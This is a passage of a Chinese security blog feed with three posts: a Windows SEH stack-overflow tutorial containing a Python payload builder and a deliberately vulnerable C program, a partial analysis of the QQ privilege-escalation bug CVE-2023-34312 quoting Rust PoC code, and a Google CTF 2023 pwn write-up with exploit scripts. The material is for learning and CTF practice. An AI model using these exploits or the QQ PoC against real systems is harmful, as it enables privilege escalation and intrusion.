class="line">&#125;</span><br></pre></td></tr></table></figure><p>在windows下的防护等级有</p><ul><li><code>ASLR</code><ul><li><code>/DYNAMICBASE</code> 带有剥离的重定位条目边缘情况</li><li><code>/HIGHENTROPYVA</code> for 64-bit systems</li></ul></li><li><code>Code integrity/signing:</code><ul><li><code>/INTEGRITYCHECK</code></li><li>使用有效（可信、活动）证书进行 Authenticode 签名（Linux 目前不支持）</li></ul></li><li><code>DEP</code><ul><li>别称：<code>W^X</code>, <code>NX</code></li></ul></li><li><code>Manifest isolation</code><ul><li><code>/ALLOWISOLATION</code></li></ul></li><li><code>SEH</code>和<code>SafeEH</code><ul><li><code>SEH</code>=<code>Structured Exception Handling</code></li></ul></li><li><code>Control Flow Guard</code>和<code>Return Flow Guard instrumentation</code></li><li><code>Stack cookie</code><ul><li><code>/GS</code></li></ul></li></ul><ol><li><p>ASLR：与Linux的PIE相同，指地址随机化，将在程序启动时将DLL随机的加载到内存中的未知，自Windows 10开始已经在系统中被配置为默认启动；</p></li><li><p>High Entropy VA：高熵64位地址空间布局随机化，开启后标识此程序的随机化取值空间为64 bit，这会导致攻击者更难去推测随机化后的地址；</p></li><li><p>Force Integrity：强制签名保护，开启后标识程序加载时需要验证其中的前命，如果签名不正确，程序将会被阻止运行；</p></li><li><p>Isolation：隔离保护，开启后表示此程序加载时将会在一个相对独立的隔离环境中被加载，从而阻止攻击者过度提升权限；</p></li><li><p>NX/DEP/PAE：NX保护指的是内存页不可运行。属于系统级的内存保护功能，能够将一页或多页标记为不可执行，从而防止从该内存区域运行代码，以帮助防止利用缓冲区溢出。防止代码在数据页面（例如堆、栈和内存池）中运行，在Windows中常称为DEP。</p><p>PAE指物理地址拓展，PAE是一项处理器功能，使x86处理器可以在部分windows版本上访问4 GB以上的物理内存。在基于x86的系统上运行的某些32位版本的Windows Server可以使用PAE访问最多64 GB或128 GB的物理内存，具体取决于处理器的物理地址大小。使用PAE，操作系统将从两级线性地址转换为三级地址转换。两级线性地址转换将线性地址拆分为3个独立的字段索引到内存表中，三级地址转换将其拆分为4个独立的字段：一个2位字段，两个9位字段和一个12位字段。PAE模式下的页表条目(PTE)和页目录条目(PDE)的大小从32位增加到64位。附加位允许操作系统PTE或PDE引用4 GB以上的物理内存，同时PAE将允许在基于x86的系统上运行32位windows中启用DEP等功能。</p></li><li><p><code>SEHOP</code>：即结构化异常处理保护(structured Exception Handling Overwrite Protection)，这个保护能够防止攻击者利用结构化异常处理来进行进一步的利用。</p></li><li><p><code>CFG</code>：即控制流防护这项技术通过在间接跳转前插入校验代码，检查目标地址的有效性，进而可以阻止执行流跳转到预期之外的地点，最终及时有效的进行异常处理，避免引发相关的安全问题。</p></li><li><p>RFG：即返回地址防护，在每个函数头部将返回地址保存到 <code>fs:[rsp](thread control stack)</code>，并在函数返回前将其与栈上返回地址进行比较，从而有效阻止攻击；</p></li><li><p>SafeSEH：安全结构化异常处理(Safe Structured Exception Handlers)，白名单版的安全沙箱，定义一些异常处理程序，并基于此构造安全结构化异常处理表，程序运行后，安全结构化异常处理表之外的异常处理程序将会被阻止运行；</p></li><li><p>GS：类似于Linux中的Canary保护，开启后，会在返回地址和BP之前压入一个额外的 <code>Security Cookie</code>，系统会比较栈中的这个值和原先存放在 <code>.data</code>中的值做一个比较，如果两者不吻合，则说明发生了栈溢出；</p></li><li><p>Authenticode：签名保护；</p></li><li><p>.NET：DLL混淆级保护</p></li></ol><p>你可以查看文件头进行识别，也可以使用winchecksec进行识别</p><p><img src="https://img.joe1sn.top/uploads/big/325814dc1fa1572df0f97d5b7bd3ddfa.png" alt="image-20230707130719644" /></p><p>非常明显的漏洞点</p><h1 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析"></a> 漏洞分析</h1><p>GCC编译<code>gcc .\main.c -o shellcode</code></p><p><img src="https://img.joe1sn.top/uploads/big/c55686928835d42421d7f6c0656f5cff.png" alt="image-20230707130122963" /></p><p>先试一下跳转，加上覆盖ebp的空间大小是<code>0x1c</code></p><p><img src="https://img.joe1sn.top/uploads/big/46eaa11d681dcd3c33a4b431e30b2c79.png" alt="image-20230707131904489" /></p><h1 id="加载shellcode"><a class="markdownIt-Anchor" href="#加载shellcode"></a> 加载shellcode</h1><p>现在想办法布置shellcode，由于没有后门函数所以需要利用SEH进行shellcode的布置。</p><p><strong>栈中的 SEH Handle 存储的形式</strong></p><p><img src="https://img.joe1sn.top/uploads/big/eb18a130a41aa85ce5a74b3ef1d61905.png" alt="img" /></p><p>基本的布置方式如下，实战的可以参考<a href="https://blog.joe1sn.top/2021/05/18/CVE-2019-9766/">CVE-2019-9766简单栈溢出</a></p><p><img src="https://img.joe1sn.top/uploads/big/8a8a4e2f63396305958ac9645adb7c9a.png" alt="img" /></p><p>使用<strong>x32dbg</strong>调试得到SEH链，然后得出payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*<span class="number">0x11c</span> <span class="comment">#0x1c</span></span><br><span class="line">test_func = <span class="string">b&quot;\xc4\x16\x40\x00&quot;</span> <span class="comment">#004016C4</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\xee\x19\x40\x00&quot;</span>    <span class="comment">#004019EE 00402537 004017EE</span></span><br><span class="line">nops = <span class="string">b&quot;\x90&quot;</span>*<span class="number">5</span>                <span class="comment">#nops</span></span><br><span class="line"></span><br><span class="line">payload = offset+NSEH+gadget+shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p>使用了gadget，进行两次pop抬栈，这样就能滑行到shellcode</p><p><img src="https://img.joe1sn.top/uploads/big/80de864faf1862d894461625d818fcb0.png" alt="image-20230708144240496" /></p><p>gadget过后的跳转</p><p><img src="https://img.joe1sn.top/uploads/big/4bdef43635c0608fb2dd1dce892a899c.png" alt="image-20230708144321174" /></p><p>但是shellcode长度有限制，所以很寄</p><p><img src="https://img.joe1sn.top/uploads/big/c2eae4db075ff3efe7d7addc866d586c.png" alt="img" /></p><p>但是我们执行一小段shellcode，那么可以尝试自己写gadget，将shellcode写入在payload前段，然后利用SEH到自己写的gadget，最后跳转到shellcode，需要注意的是程序会把第五位归0，所以要注意。</p><p>在使用<code>fscanf</code>函数读取字符串时，以下特殊字符可能会导致读取失败或产生意外的结果：</p><ol><li>空格 (<code>0x20</code>)</li><li>制表符 (<code>0x09</code>)</li><li>换行符 (<code>0x0A</code>)</li><li>回车符 (<code>0x0D</code>)</li></ol><p>这块儿就只有自己根据实际情况改进shellcode了。</p><p>那么我稍微改进一下源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hacked</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hacked\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> password[<span class="number">6</span>] = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">6</span>];</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">if</span>(!(fp=fopen(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)))</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">fgets(str, <span class="number">0x1000</span>, fp);</span><br><span class="line"></span><br><span class="line">str[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,password)==<span class="number">0</span>)</span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;OK.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OK.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;NO.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">vuln();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于栈比较小，可以考虑自己写入gadget来帮助shellcode的跳转</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x11c</span>-<span class="built_in">len</span>(shellcode)-<span class="number">16</span>) <span class="comment">#0x1c</span></span><br><span class="line">test_func = <span class="string">b&quot;\xc4\x16\x40\x00&quot;</span> <span class="comment">#004016C4</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\xee\x19\x40\x00&quot;</span>    <span class="comment">#004019EE 00402537 004017EE</span></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x14\x06\x00\x00\xFF\xE0&quot;</span></span><br><span class="line">                                                        <span class="comment"># mov eax, esp</span></span><br><span class="line">                                                        <span class="comment"># sub eax, 0x608</span></span><br><span class="line">                                                        <span class="comment"># jmp eax</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">16</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/84688c248714ebea01d6ca5d019c7bb4.gif" alt="img" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;[Win Pwn] 基础栈溢出利用&lt;/p&gt;
&lt;p&gt;window下无保护的栈溢出加载shellcode&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞复现】CVE-2023-34312分析</title>
    <link href="https://joe1sn.eu.org/2023/07/03/qq-evasion/"/>
    <id>https://joe1sn.eu.org/2023/07/03/qq-evasion/</id>
    <published>2023-07-03T12:13:39.000Z</published>
    <updated>2023-07-18T01:32:15.629Z</updated>
    
    <content type="html"><![CDATA[<p>关于QQ提权漏洞CVE-2023-34312的分析</p><p>！！未完待续！！</p><span id="more"></span><h1 id="poc分析"><a class="markdownIt-Anchor" href="#poc分析"></a> PoC分析</h1><p>PoC地址：<a href="https://github.com/vi3t1/qq-tim-elevation%EF%BC%8C%E7%94%A8rust%E5%86%99%E7%9A%84%E6%8C%89%E7%85%A7%E6%95%99%E7%A8%8B%E7%BC%96%E8%AF%91%E5%A5%BD%E4%BA%86%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E6%89%93%E4%BA%86">https://github.com/vi3t1/qq-tim-elevation，用rust写的按照教程编译好了就可以直接打了</a></p><p>由于没有开启ASLR保护所以很稳</p><p><img src="D:%5CPictures%5Ctypora%5Cpsc.jpg" alt="psc" /></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703201740757.png" alt="image-20230703201740757" /></p><p>接着是分析一下PoC</p><h2 id="触发"><a class="markdownIt-Anchor" href="#触发"></a> 触发</h2><p>触发方式是<code>.\QQProtect .\evil.dll</code>，同时必须保持<code>tinyxml.dll</code>在同一目录下，这里用QQ9.7.7举例子。</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703202240244.png" alt="image-20230703202240244" /></p><p>首先是<a href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinew"><code>GetCommandLineW</code></a>获得启动参数，接着判断置否存在下列关键参数，然后不存在关键参数直接到了<code>StartAddress</code></p><p>使用<code>QQProtectEngine.dll</code>中的<code>RunQQProtect</code>，设置回调函数<code>sub_40C950</code></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703203114437.png" alt="image-20230703203114437" /></p><p>回调函数中的<code>a2</code>指针可以将任何地址的值设置为参数分析时的参数个数值，也就是 <strong>1</strong>。</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703203402262.png" alt="image-20230703203402262" /></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703211606183.png" alt="image-20230703211606183" /></p><p>那么现在我们就有了将任意地址写为1的能力，恰好<code>QQProtect.exe</code>没有开启<code>ASLR</code>保护，若开启的话下图应该存在<code>IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE </code></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703204248679.png" alt="image-20230703204248679" /></p><h2 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> PoC</h2><p>和上文中结合起来，在<code>QQProtect</code>中导入了<code>tinyxml.dll</code>，所以可以修改这个dll的内容来执行攻击。</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230704082005386.png" alt="image-20230704082005386" /></p><ul><li><p>PoC首先获取了<code>evil.dll</code>的路径，</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">evil_dllpath</span>: <span class="type">String</span> = std::env::<span class="title function_ invoke__">args</span>().<span class="title function_ invoke__">nth</span>(<span class="number">1</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"><span class="keyword">let</span> <span class="variable">evil_dllpath</span>: std::path::PathBuf = std::path::Path::<span class="title function_ invoke__">new</span>(&amp;evil_dllpath).<span class="title function_ invoke__">canonicalize</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;evil dll: &#123;&#125;&quot;</span>, evil_dllpath.<span class="title function_ invoke__">display</span>());</span><br></pre></td></tr></table></figure><p>接着打开服务获得<code>QQProtectEngine.dll</code>的基地址（因为他开启了ASLR保护）。<br /><img src="D:%5CPictures%5Ctypora%5Cimage-20230704082356731.png" alt="image-20230704082356731" /><br />在PoC中打开了Windows的<code>QPCore</code>服务然后获取配置信息，从配置信息中提取出<code>qqprotect.exe</code>和<code>QQProtectEngine.dll</code>的路径。<br />由于<code>LoadLibraryExW</code>中使用了<code>DONT_RESOLVE_DLL_REFERENCES</code>所以不会调用DLLMain，若函数成功，则返回值是已加载模块的句柄，从句柄的第一个值提取出加载的地址。注意的是，这里是首先加载<code>tinyxml.dll</code>，所以加载的<code>QQProtectEngine.dll</code>的地址在这里同一样适用，这样就获得了<code>QQProtectEngine.dll</code>的基地址。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">get_qqprotectengine_dllbase</span>() <span class="punctuation">-&gt;</span> <span class="type">u32</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">manager</span> = ServiceManager::<span class="title function_ invoke__">local_computer</span>(None::&lt;&amp;<span class="type">str</span>&gt;, ServiceManagerAccess::ENUMERATE_SERVICE).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">service</span> = manager.<span class="title function_ invoke__">open_service</span>(<span class="string">&quot;QPCore&quot;</span>, ServiceAccess::QUERY_CONFIG).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">service_config</span> = service.<span class="title function_ invoke__">query_config</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">qqprotect_exe</span> = windows_args::ArgsOs::<span class="title function_ invoke__">parse_cmd</span>(service_config.executable_path.<span class="title function_ invoke__">as_os_str</span>()).<span class="title function_ invoke__">next</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">qqprotectengine_dll</span> = std::path::Path::<span class="title function_ invoke__">new</span>(&amp;qqprotect_exe).<span class="title function_ invoke__">parent</span>().<span class="title function_ invoke__">unwrap</span>().<span class="title function_ invoke__">join</span>(<span class="string">&quot;QQProtectEngine.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">h</span> = <span class="title function_ invoke__">LoadLibraryExW</span>(<span class="title function_ invoke__">PCWSTR</span>(HSTRING::<span class="title function_ invoke__">from</span>(qqprotectengine_dll.<span class="title function_ invoke__">as_path</span>()).<span class="title function_ invoke__">as_ptr</span>()), HANDLE::<span class="title function_ invoke__">default</span>(), DONT_RESOLVE_DLL_REFERENCES).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">base</span> = h.<span class="number">0</span> <span class="keyword">as</span> <span class="type">u32</span>;</span><br><span class="line">        <span class="title function_ invoke__">FreeLibrary</span>(h);</span><br><span class="line">        <span class="keyword">return</span> base;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>创建IPC进程间通讯</p><p>如何找到IPC通讯，可以在<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist%E5%AE%89%E8%A3%85%60pipelist%60%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E7%9A%84%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E9%80%9A%E8%AE%AF">https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist安装`pipelist`查看所有的命名管道通讯</a></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230716221331756.png" alt="image-20230716221331756" /></p><p>那么在<code>QQProtect.exe</code>一定会有一个连接命名管道的地方，在<code>QQProtectEnginee.dll</code>中使用</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230716230155905.png" alt="image-20230716230155905" /></p><p>找到对应的管道命名</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230716230225143.png" alt="image-20230716230225143" /></p><p>和</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230716232640237.png" alt="image-20230716232640237" /></p><p>（回调分析麻了）之后会进入QSection.dll中的函数，具体逆向可以看B战大佬的视频：<a href="https://www.bilibili.com/video/BV1wm4y1E7TL">https://www.bilibili.com/video/BV1wm4y1E7TL</a></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230717091525707.png" alt="image-20230717091525707" /></p><p>很像一个结构体。加载了<code>QPSection</code>后调用了6号导出函数，之后还需要对结构体进行逆向</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;关于QQ提权漏洞CVE-2023-34312的分析&lt;/p&gt;
&lt;p&gt;！！未完待续！！&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>【CTF】2023 Google CTF WriteUp与复现</title>
    <link href="https://joe1sn.eu.org/2023/06/26/googleCTF-wp/"/>
    <id>https://joe1sn.eu.org/2023/06/26/googleCTF-wp/</id>
    <published>2023-06-26T15:44:49.000Z</published>
    <updated>2023-06-27T12:28:50.376Z</updated>
    
    <content type="html"><![CDATA[<p>端午节打的比赛，事情比较多没怎么看题，指导学弟做了下，这里来个复盘。</p><p>开始CTF的复健之路吧。</p><span id="more"></span><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h1><h2 id="write-flag-where"><a class="markdownIt-Anchor" href="#write-flag-where"></a> WRITE-FLAG-WHERE</h2><p>最简单的一道pwn，没有开ASLR保护。当时我的机器跑不起来，学弟的能跑，和他一起分析。</p><p>程序的主逻辑是读取<code>/proc/self/maps</code>来读取存在的内存（gdb中的vmmap就是这样实现的），然后把 <strong>flag</strong> 读取到一个全局变量中，最后我们可以在任意一个地址<strong>写入</strong>任意长度（<code>&lt;0x7f</code>）的<code>flag</code>中的字符串。</p><p>当时我们是在arch上做的，使用gdb能看到输出，然后尝试将flag覆盖内存中的提示语句</p><p><img src="https://img.joe1sn.top/uploads/big/db64be7c974c4b8874990bf43ad75d96.png" alt="image-20230626235900892" /></p><p>那么地址就是 <code>*$rebase(0x21E0)</code>，尝试远程</p><p><img src="https://img.joe1sn.top/uploads/big/7e185357a6df34bb8a05fe88e2715475.png" alt="image-20230627000119117" /></p><p>得到flag</p><blockquote><p>CTF{Y0ur_j0urn3y_is_0n1y_ju5t_b39innin9}</p></blockquote><h2 id="write-flag-where-2"><a class="markdownIt-Anchor" href="#write-flag-where-2"></a> WRITE-FLAG-WHERE 2</h2><p>当时离做出来差了亿点点。</p><p>保护没变，但是删除了之前的字符串修改点。后来我看到了有一段无关的代码段</p><p><img src="https://img.joe1sn.top/uploads/big/aceaa896af8bd2be3eee5d25bceb04c8.png" alt="image-20230627000724135" /></p><p>后来想这道题快想魔怔了</p><h3 id="未解出使用sscanf覆盖"><a class="markdownIt-Anchor" href="#未解出使用sscanf覆盖"></a> 【未解出】使用sscanf覆盖</h3><p><img src="https://img.joe1sn.top/uploads/big/0e87335c869798bc686b697a732f6b20.png" alt="image-20230627000846031" /></p><p>挺疯狂的一个想法，由于死循环内不存在输入，但是sscanf会根据你的输入去匹配，然后我们又知道flag是<code>CTF&#123;xxxx&#125;</code>，所以可以覆盖<code>0x%llx %u</code>的第一个，类似于：</p><p><img src="https://img.joe1sn.top/uploads/big/44c200a9d509624944d2043e3844fd92.png" alt="image-20230627001051107" /></p><p>逐步缩小地址爆破得到flag，但是考虑到工作量而且太久没做CTF导致pwntools的不熟悉没有能成功</p><h3 id="差一点可视化shellcode"><a class="markdownIt-Anchor" href="#差一点可视化shellcode"></a> 【差一点】可视化shellcode</h3><p>和上面的思路差不多，只不过是利用了<code>T</code>的ASCII为<code>0x54</code>，而<code>0x54</code>的汇编码是<code>push rsp</code>，那么一直写入<code>T</code>，让最后的退出划入那段不相关的代码段</p><p><img src="https://img.joe1sn.top/uploads/big/c680a99fbe9de70f0ceb090c72232757.png" alt="image-20230627001337193" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">nop2</span>(<span class="params">addr,lenth</span>):</span><br><span class="line">  r.sendline(<span class="string">b&quot;0x%x %d&quot;</span> % (addr+base,lenth))</span><br><span class="line">  sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">nop2(<span class="number">0x20d5</span>,<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    nop2(<span class="number">0x1443</span>-i,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;0x1234 111111&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/7092af8c58cfd633f124fae3ad84d73a.png" alt="image-20230627015659635" /></p><p>最后得到flag</p><blockquote><p>CTF{impr355iv3_6ut_can_y0u_s01v3_cha113ng3_3?}</p></blockquote><p><strong>注意：由于网络延时最后的flag不开代理导致没有收到…</strong></p><h2 id="write-flag-where-3"><a class="markdownIt-Anchor" href="#write-flag-where-3"></a> WRITE-FLAG-WHERE 3</h2><p>上一道题直接导致心态爆炸，这道题没怎么看。不过看上去限制了我们能修改的地址范围 <strong>不能</strong> 是<code>main</code>函数±<code>0x5000</code>的位置，导致之前的exp失效。</p><p><img src="https://img.joe1sn.top/uploads/big/e5d935cfb2c1e29b8fb6f314e69cf4b1.png" alt="image-20230627011217278" /></p><p>不过本地patched过的版本成功调用了<code>alarm</code></p><p><img src="https://img.joe1sn.top/uploads/big/7eb896172074ac45b77a71ffa43d81af.png" alt="image-20230627013114680" /></p><p>那么试试修改libc中的报错为flag，但是不行</p><p>不过思路也是很接近的了，在官方的exp中使用了<code>&#125;</code>，作为<code>jnp</code>来进行爆破。其他也是使用了一下gadget，利用<code>jnp 0x48</code>实现ROP的跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r3tr0@pwnmachine:~$ rasm2 -ax86 -b64 -d 0x4354467b4354 </span><br><span class="line">push r12</span><br><span class="line">jnp 0x48</span><br><span class="line">push rsp</span><br></pre></td></tr></table></figure><ol><li>使用2中的思路覆写libc中的<code>exit</code></li><li>由于输入位于栈上使用，输入组合的ROP链，由于libc中的<code>exit</code>已经被覆写，所以程序会返回<code>ret</code>，从而触发ROP链，最后实现write写出flag</li></ol><p>这里使用r3kpig的exp打一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span 